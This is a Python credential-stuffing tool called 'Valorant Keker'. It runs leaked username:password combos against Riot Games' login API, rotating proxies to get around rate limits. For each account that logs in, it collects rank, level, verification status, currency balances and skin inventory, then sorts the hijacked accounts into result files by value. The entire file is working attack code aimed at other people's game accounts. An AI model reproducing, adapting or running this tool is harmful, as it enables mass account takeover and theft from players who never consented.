
from colorama import Fore
import ctypes, time, os, collections, requests
from datetime import datetime
from ssl import PROTOCOL_TLSv1_2
from urllib3 import PoolManager
from requests.adapters import HTTPAdapter

white = Fore.WHITE
clear = "cls"

class TLSAdapter(HTTPAdapter):
    def init_poolmanager(self, connections, maxsize, block=False):
        self.poolmanager = PoolManager(num_pools=connections, maxsize=maxsize, block=block, ssl_version=PROTOCOL_TLSv1_2)

ascii_text = """                 _                       _            
     __   ____ _| | ___  _ __ __ _ _ __ | |_   
     \ \ / / _` | |/ _ \| '__/ _` | '_ \| __| 
      \ V / (_| | | (_) | | | (_| | | | | |_  
       \_/ \__,_|_|\___/|_|  \__,_|_| |_|\__|    """
class valorant:

    def __init__(self):
        self.proxies = []
        self.combos = []
        self.checked = 0
        self.valid = 0
        self.invalid = 0
        self.bad_combo = 0
        self.skinned = 0
        self.no_skins = 0
        self.unranked = 0
        self.iron = 0
        self.bronze = 0
        self.silver = 0
        self.gold = 0
        self.plat = 0
        self.dia = 0
        self.ascendant = 0
        self.immortal = 0
        self.ratelimits = 0
        self.radiant = 0
        self.verified = 0
        self.unverified = 0
        self.errors = 0
        self.error_messages = False
        self.bad_proxy = 0
        self.failed_accounts = []
        self.connection_errors = 0
        self._1_9 = 0
        self._10_19 = 0
        self._20_29 = 0
        self._30_39 = 0
        self._40_49 = 0
        self._50_59 = 0
        self._60_69 = 0
        self._70_79 = 0
        self._80plus = 0
        self.proxies = []
        self.proxy_counter = 0

    def change_title(self, arg):
        ctypes.windll.kernel32.SetConsoleTitleW(arg)
    
    def wait(self):
        time.sleep(100000)
        os._exit(0)
    
    def log(self, error):
        now = datetime.now()
        dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
        self.errors += 1
        self.error_messages = True
        self.update_title()
        with open("Logs.txt", "a") as f:
            f.write(f"==========================\n{dt_string}\n{error}\n==========================\n\n")
        
    def remove_line(self, line, filename):
        with open(filename, "r") as f:
            lines = f.readlines()
        with open(filename, "w") as f:
            for line in lines:
                if line.strip("\n") != line:
                    f.write(line)
    
    def load_combos(self):
        try:
            with open("combo.txt", "r", encoding="ISO-8859-1") as f:
                for line in f.readlines():
                    line = line.replace("\n", "")
                    self.combos.append(line)
            first_line = self.combos[0]
        except Exception as e:
            self.log(e)
        
    def load_proxies(self):
        try:
            with open("proxies.txt", "r", encoding="ISO-8859-1") as f:
                for line in f.readlines():
                    line = line.replace("\n", "")
                    self.proxies.append(line)
            first_line = self.proxies[0]
        except Exception as e:
            self.log(e)

    def update_title(self):
        os.system(clear)
        self.change_title("Valorant Keker | Github: @useragents | https://github.com/useragents")
        print(Fore.LIGHTMAGENTA_EX + ascii_text)
        print(f"\n{white}     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print(f"{white}     -                 Checked                >>:({Fore.LIGHTYELLOW_EX}{self.checked}/{len(self.combos)}{white})")
        print(f"{white}     -                 Valid                  >>:({Fore.LIGHTGREEN_EX}{self.valid}{white})")	
        print(f"{white}     -                 Invalid                >>:({Fore.LIGHTRED_EX}{self.invalid}{white})")	
        print(f"{white}     -                 Bad Combo              >>:({Fore.RED}{self.bad_combo}{white})")
        print(f"{white}     -                 Unverified             >>:({Fore.LIGHTGREEN_EX}{self.verified}{white})")
        print(f"{white}     -                 Verified               >>:({Fore.LIGHTRED_EX}{self.verified}{white})")
        print(f"{white}     -                 Logged Errors          >>:({Fore.LIGHTRED_EX}{self.errors}{white})")
        print(f"{white}     -                 Ratelimits             >>:({Fore.LIGHTRED_EX}{self.ratelimits}{white})")
        print(f"{white}     -                 Bad Proxy              >>:({Fore.LIGHTRED_EX}{self.bad_proxy}{white})")
        print(f"{white}     -                 Connection Errors      >>:({Fore.LIGHTRED_EX}{self.connection_errors}{white})")
        print(f"{white}     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print(f"{white}     -                 Skinned                >>:({Fore.LIGHTGREEN_EX}{self.skinned}{white})")
        print(f"{white}     -                 No Skins               >>:({Fore.LIGHTRED_EX}{self.no_skins}{white})")
        print(f"{white}     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print(f"{white}     -                 Unranked               >>:({Fore.CYAN}{self.unranked}{white})")
        print(f"{white}     -                 Iron                   >>:({Fore.CYAN}{self.iron}{white})")
        print(f"{white}     -                 Bronze                 >>:({Fore.CYAN}{self.bronze}{white})")
        print(f"{white}     -                 Silver                 >>:({Fore.CYAN}{self.silver}{white})")
        print(f"{white}     -                 Gold                   >>:({Fore.CYAN}{self.gold}{white})")
        print(f"{white}     -                 Platinum               >>:({Fore.CYAN}{self.plat}{white})")
        print(f"{white}     -                 Diamond                >>:({Fore.CYAN}{self.dia}{white})")
        print(f"{white}     -                 Ascendant              >>:({Fore.CYAN}{self.ascendant}{white})")
        print(f"{white}     -                 Radiant                >>:({Fore.CYAN}{self.radiant}{white})")
        print(f"{white}     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print(f"{white}     -                 1-9                    >>:({Fore.CYAN}{self._1_9}{white})")
        print(f"{white}     -                 10-19                  >>:({Fore.CYAN}{self._10_19}{white})")
        print(f"{white}     -                 20-29                  >>:({Fore.CYAN}{self._20_29}{white})")
        print(f"{white}     -                 30-39                  >>:({Fore.CYAN}{self._30_39}{white})")
        print(f"{white}     -                 40-49                  >>:({Fore.CYAN}{self._40_49}{white})")
        print(f"{white}     -                 50-59                  >>:({Fore.CYAN}{self._50_59}{white})")
        print(f"{white}     -                 60-69                  >>:({Fore.CYAN}{self._60_69}{white})")
        print(f"{white}     -                 70-79                  >>:({Fore.CYAN}{self._70_79}{white})")
        print(f"{white}     -                 80+                    >>:({Fore.CYAN}{self._80plus}{white})")
        if self.error_messages:
            print(f"\n{white}     [{Fore.RED}!{Fore.WHITE}] An error has occurred, please view log file.")
    
    def session(self):
        session = requests.Session()
        session.trust_env = False
        return session

    def check_account(self, combo, proxy = None):
        try:
            username, password = combo.split(":")
        except:
            self.bad_combo += 1
            self.checked += 1
            self.update_title()
            return
        proxies = None
        if proxy != None:
            proxies = {"https": f"https://{proxy}"}
        headers = {
            "Accept-Language": "en-US,en;q=0.9",
            "Accept": "application/json, text/plain, */*",
            'User-Agent': 'RiotClient/51.0.0.4429735.4381201 rso-auth (Windows;10;;Professional, x64)'
        }
        session = self.session()
        #session.headers = headers
        #session.mount('https://', TLSAdapter())
        data = {
            "client_id": "play-valorant-web-prod",
            "nonce": "1",
            "redirect_uri": "https://playvalorant.com/opt_in",
            "response_type": "token id_token",
            'scope': 'account openid',
        }
        headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'RiotClient/51.0.0.4429735.4381201 rso-auth (Windows;10;;Professional, x64)',
            "Accept-Language": "en-US,en;q=0.9",
            "Accept": "application/json, text/plain, */*",
        }
        try:
            r = session.post(f'https://auth.riotgames.com/api/v1/authorization', json=data, headers=headers, proxies=proxies)
        except Exception as e:
            self.connection_errors += 1
            #self.log(f"check_account()\nAccount: {combo}\nError: {e}\nProxy: {proxy}\nEndpoint: POST https://auth.riotgames.com/api/v1/authorization")
            self.failed_accounts.append(combo)
            self.update_title()
            return
        data = {
            'type': 'auth',
            'username': username,
            'password': password
        }
        try:
            login = session.put('https://auth.riotgames.com/api/v1/authorization', json=data, headers=headers, proxies=proxies)
        except Exception as e:
            self.connection_errors += 1
            self.failed_accounts.append(combo)
            #self.log(f"check_account()\nAccount: {combo}\nError: {e}\nProxy: {proxy}\nEndpoint: PUT https://auth.riotgames.com/api/v1/authorization")
            self.update_title()
            return
        if "You do not have access to auth.riotgames.com" in login.text:
            self.bad_proxy += 1
            self.update_title()
            self.failed_accounts.append(combo)
        elif "uri" in login.text:
            try:
                uri = login.json()["response"]["parameters"]["uri"]
            except Exception as e:
                self.failed_accounts.append(combo)
                self.log(f"check_account()\nAccount: {combo}\nError: {e}\nResponse: {r.text} {r.status_code}\nProxy: {proxy}\nEndpoint: PUT https://auth.riotgames.com/api/v1/authorization")
                self.update_title()
                return
            access_token = uri.split("access_token=")[1].split("&")[0]
            self.valid += 1
            self.checked += 1
            with open(f"Results/{self.dt_string}/No Capture Valid.txt", "a") as f:
                f.write(combo + "\n")
            self.update_title()
            token = self.get_entitlement_token(access_token, session, proxies)
            if token == None:
                return
            self.current_combo = combo
            country, sub, email_verified, phone_verified, account_verified, user = self.user_info(session, access_token)
            region, level, headers = self.get_region(user)  
            rank = self.check_rank(region, sub, token, access_token)
            self.update_rank_stats(rank)
            vp, rp = self.check_points(headers, sub, region)
            skins = self.check_skins(region, sub, token, access_token)
            self.update_skin_stats(skins, region, vp, rp, rank, level, country, email_verified, phone_verified, account_verified)
        elif "auth_failure" in login.text:
            self.invalid += 1
            self.remove_line(combo, "combo.txt")
            self.checked += 1
            self.update_title()
        elif "rate_limited" in login.text:
            self.ratelimits += 1
            self.failed_accounts.append(combo)
            self.update_title()
            time.sleep(10)
        else:
            self.checked += 1
            self.log(f"check_account()\nResponse: {login.text}\nAccount: {combo}")
        
    def check_skins(self, region, sub, entitlement_token, access_token):
        headers ={
            "X-Riot-Entitlements-JWT": entitlement_token,
            "Authorization": "Bearer {}".format(access_token)
        }
        r = requests.Session().get(f"https://pd.{region}.a.pvp.net/store/v1/entitlements/{sub}/e7c63390-eda7-46e0-bb7a-a6abdacd2433", headers = headers)
        skin_list = requests.Session().get("https://raw.githubusercontent.com/CSTCryst/Skin-Api/main/SkinList").text
        skin_list = skin_list.splitlines()
        skins = r.json()["Entitlements"]
        final_skins = []
        for skin in skins:
            skin_id = skin["ItemID"]
            for line in skin_list:
                api_skin_name, api_skinid = line.split("|")
                api_skinid = api_skinid.split(":")[0].lower()
                api_skin_name = api_skin_name.split(":")[1]
                if api_skinid == skin_id:
                    if "Standard" not in api_skin_name:
                        if "Melee" != api_skin_name:
                            final_skins.append(api_skin_name)
        return final_skins

    def update_skin_stats(self, skin_list, region, vp, rp, rank, level, country, email_verified, phone_verified, account_verified):
        skin_amount = len(skin_list) 
        skin_amount = int(skin_amount)
        print(region)
        verified = "Yes"
        if account_verified == False:
            verified = "False, account is unverified"
        temp = "("
        if phone_verified == True:
            temp += "Phone"
        if email_verified == True: #I am not proud of whatever this is either. :)
            if phone_verified:
                temp += ", "
            temp += "Email"
        temp += ")"
        if verified == "Yes":
            verified = f"Yes {temp}"
        account = f"========================\n"
        account += f"Login: {self.current_combo}\n"
        account += f"Rank: {rank}\n"
        account += f"Account Level: {level}\n"
        account += f"Verified: {verified}\n"
        account += f"Country: {country}\n"
        account += f"Skins: {skin_amount}\n"
        
        for skin in skin_list:
            account += f"    -> {skin}\n"
        account += f"Region: {region}\nRP: {rp}\nVP: {vp}\n"
        account += f"========================"
        if skin_amount in range(1, 9):
            self._1_9 += 1
            with open(f"Results/{self.dt_string}/{region}/1-9.txt", "a") as f:
                f.write(account + "\n")
        elif skin_amount in range(10, 19):
            self._10_19 += 1
            with open(f"Results/{self.dt_string}/{region}/10-19.txt", "a") as f:
                f.write(account + "\n")
        elif skin_amount in range(20, 29):
            self._20_29 += 1
            with open(f"Results/{self.dt_string}/{region}/10-19.txt", "a") as f:
                f.write(account + "\n")
        elif skin_amount in range(30, 39):
            self._30_39 += 1
            with open(f"Results/{self.dt_string}/{region}/10-19.txt", "a") as f:
                f.write(account + "\n")
        elif skin_amount in range(40, 49):
            self._40_49 += 1
            with open(f"Results/{self.dt_string}/{region}/10-19.txt", "a") as f:
                f.write(account + "\n")
        elif skin_amount in range(50, 59):
            self._50_59 += 1
            with open(f"Results/{self.dt_string}/{region}/10-19.txt", "a") as f:
                f.write(account + "\n")
        elif skin_amount in range(60, 69):
            self._60_69 += 1
            with open(f"Results/{self.dt_string}/{region}/10-19.txt", "a") as f:
                f.write(account + "\n")
        elif skin_amount in range(70, 79):
            self._70_79 += 1
            with open(f"Results/{self.dt_string}/{region}/10-19.txt", "a") as f:
                f.write(account + "\n")
        elif skin_amount >= 80:
            self._80plus += 1
            with open(f"Results/{self.dt_string}/{region}/10-19.txt", "a") as f:
                f.write(account + "\n")
        self.update_title()
        
    def update_rank_stats(self, rank):
        rank = rank.lower()
        if "unranked" in rank:
            self.unranked += 1
        elif "iron" in rank:
            self.iron += 1
        elif "bronze" in rank:
            self.bronze += 1
        elif "silver" in rank:
            self.silver += 1
        elif "gold" in rank:
            self.gold += 1
        elif "plat" in rank:
            self.plat += 1
        elif "diamond" in rank:
            self.dia += 1
        elif "ascendant" in rank:
            self.ascendant += 1
        elif "immortal" in rank:
            self.immortal += 1
        elif "radiant" in rank:
            self.radiant += 1
        self.update_title()
        
    def get_entitlement_token(self, token, session, proxies):
        headers = {
            "User-Agent": "RiotClient/51.0.0.4429735.4381201 rso-auth (Windows;10;;Professional, x64)",
            "Authorization": f"Bearer " + token,
        }
        try:
            r = session.post("https://entitlements.auth.riotgames.com/api/token/v1", headers = headers, json = {}, proxies = proxies)
        except:
            self.connection_errors += 1
            self.update_title()
            self.failed_accounts.append(self.current_combo)
            return None
        if "entitlements_token" in r.text:
            token = r.json()["entitlements_token"]
            return token
        else:
            self.log(f"get_entitlement_token()\nResponse: {r.text}\nAccount: {self.current_combo}")
            return None
        
    def get_region(self, user):
        headers = {
            "Accept": "*/*",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
            "Content-Type": "application/json",
            "Pragma": "no-cache"
        }
        name, tag = user.split("#")
        r = requests.Session().get("https://api.henrikdev.xyz/valorant/v1/account/{}/{}".format(name, tag), headers = headers)
        if "region" in r.text:
            _json = r.json()["data"]
            region = _json["region"]
            level = _json["account_level"]
            return region, level, headers
        else:
            self.log(f"get_region()\nAccount: {self.current_combo}\nError: Unexpected response. Will be ignored but for reference: {r.text} {r.status_code}")
            region = "na" #We will guess NA since it is the most popular region.
            return region, "Unknown", headers
    
    def check_points(self, headers, sub, region):
        try:
            r = requests.Session().get("https://pd.{}.a.pvp.net/store/v1/wallet/{}".format(region, sub), headers = headers)
            vp = r.json()["Balances"]["85ad13f7-3d1b-5128-9eb2-7cd8ee0b5741"]
            rp = r.json()["Balances"]["e59aa87c-4cbf-517a-5983-6e81511be9b7"]
        except:
            vp = "Unknown"
            rp = "Unknown"
        return vp, rp

        
    def rank(self, rank_id):
        with open("rank_ids.txt", "a") as f:
            f.write(str(rank_id) + "\n")
        rank_list = {
            0: "Unranked",
            1: "Unranked",
            2: "Unranked",
            3: "Iron 1",
            4: "Iron 2",
            5: "Iron 3",
            6: "Bronze 1",
            7: "Bronze 2",
            8: "Bronze 3",
            9: "Silver 1",
            10: "Silver 2", 
            11: "Silver 3",
            12: "Gold 1",
            13: "Gold 2",
            14: "Gold 3",
            15: "Platinum 1",
            16: "Platinum 2",
            17: "Platinum 3",
            18: "Diamond 1",
            19: "Diamond 2",
            20: "Diamond 3",
            21: "Ascendant 1",
            22: "Ascendant 2",
            23: "Ascendant 3",
            24: "Immortal 1",
            25: "Immortal 2",
            26: "Immortal 3",
            27: "Radiant"
        }
        return rank_list[rank_id]
    
    def check_rank(self, region, sub, entitlement_token, access_token):
        headers = {
            "Content-Type": "application/json",
            "Authorization": "Bearer {}".format(access_token),
            "X-Riot-Entitlements-JWT": entitlement_token,
            "X-Riot-ClientVersion": "release-01.08-shipping-10-471230",
            "X-Riot-ClientPlatform": "ew0KCSJwbGF0Zm9ybVR5cGUiOiAiUEMiLA0KCSJwbGF0Zm9ybU9TIjogIldpbmRvd3MiLA0KCSJwbGF0Zm9ybU9TVmVyc2lvbiI6ICIxMC4wLjE5MDQyLjEuMjU2LjY0Yml0IiwNCgkicGxhdGZvcm1DaGlwc2V0IjogIlVua25vd24iDQp9"
        } 
        
        try:
            r = requests.Session().get("https://pd.{}.a.pvp.net/mmr/v1/players/{}/competitiveupdates".format(region, sub), headers = headers)
        except Exception as e:
            self.connection_errors += 1
            self.failed_accounts.append(self.current_combo)
            self.log(f"check_rank()\nAccount: {self.current_combo}\nError: {e}")
            self.update_title()
            return
        if "Matches" in r.text:
            if r.json()["Matches"] == []:
                rank_name = "Unranked"
            else:
                latest_match = r.json()["Matches"][0]
                rank_id = latest_match["TierAfterUpdate"]
                rank_name = self.rank(rank_id)
            return rank_name
        else:
            self.log(f"check_rank()\nResponse: {r.text}\nAccount: {self.current_combo}")
            self.failed_accounts.append(self.current_combo)
        
    def create(self, name):
        time.sleep(1)
        if not os.path.exists(name):
            os.mkdir(name)
        
    def user_info(self, session, token):
        try:
            headers = {
                "Accept": "*/*",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
                "Content-Type": "application/json",
                "Pragma": "no-cache",
                "Authorization": "Bearer {}".format(token)
            }
            r = session.post("https://auth.riotgames.com/userinfo", headers = headers)
            if r.status_code == 200:
                _json = r.json()
                country = _json["country"]
                sub = _json["sub"]
                email_verified = _json["email_verified"]
                phone_verified = _json["phone_number_verified"]
                account_verified = _json["account_verified"]
                user = _json["acct"]["game_name"] + "#" + _json["acct"]["tag_line"]
                return country, sub, email_verified, phone_verified, account_verified, user
        except Exception as e:
            self.log(f"user_info()\nAccount: {self.current_combo}\nError: {e}")

    def create_folders(self):
        os.system("cls")
        print(f"\n{Fore.WHITE}[{Fore.GREEN}-{Fore.WHITE}] Please wait while we create folders for capture...")
        print(f"{Fore.WHITE}[{Fore.GREEN}-{Fore.WHITE}] Please note this script is in BETA version, if you are facing any issues:")
        print(f"{Fore.WHITE}[{Fore.GREEN}-{Fore.WHITE}] https://github.com/useragents")
        print(f"{Fore.WHITE}[{Fore.GREEN}-{Fore.WHITE}] Create an issue on the Github repo with Logs.txt file if any.")
        
        now = datetime.now()
        self.dt_string = now.strftime("%d-%m-%Y %H.%M.%S")
        self.create("Results")
        self.create(os.path.join("Results/", self.dt_string))
        folders = [
            "EU",
            "NA",
            "LATAM",
            "BR",
            "KR",
            "AP",
        ]
        for folder in folders:
            path = os.path.join("Results/" + self.dt_string, folder)
            self.create(path)
        os.system("cls")
            
    def start_checking(self):
        try:
            self.create_folders()
            def check(account):
                
                if self.proxyless:
                    self.check_account(account)
                else:
                    proxy = self.proxies[self.proxy_counter]
                    self.check_account(account, proxy)
                    self.proxy_counter += 1
                    if len(self.proxies) <= self.proxy_counter:
                        self.proxy_counter = 0
            for account in self.combos:
                check(account)
            self.proxy_counter = 0
            while True:
                if not len(self.failed_accounts):
                    break
                for account in self.failed_accounts:
                    check(account)
        except Exception as e:
            print(f"\n{white}     [{Fore.RED}!{Fore.WHITE}] An error has occurred, please view log file.")
            self.log(f"start_checking()\nError: {e} Combos: {len(self.combos)} Proxies: {len(self.proxies)}")

    def main(self):
        os.system("cls")
        self.change_title("Valorant Keker | Github: @useragents | https://github.com/useragents")
        print(Fore.MAGENTA + ascii_text)
        self.proxyless = False
        print(f"\n{white}     [{Fore.GREEN}1{Fore.WHITE}] Proxyless (Ratelimits will occur)")
        print(f"{white}     [{Fore.GREEN}2{Fore.WHITE}] Use proxies from proxies.txt")
        option = int(input(f"\n{white}     [{Fore.GREEN}>{Fore.WHITE}] "))
        if option == 1:
            self.proxyless = True
        else:
            print(f"\n{white}     [{Fore.GREEN}2{Fore.WHITE}] Loading proxies from proxies.txt")
        print(f"\n{white}     [{Fore.GREEN}2{Fore.WHITE}] Loading combo from combo.txt")
        self.load_combos()
        if not self.proxyless:
            self.load_proxies()
        self.start_checking()

obj = valorant()
obj.main()
input("\nFinished.")
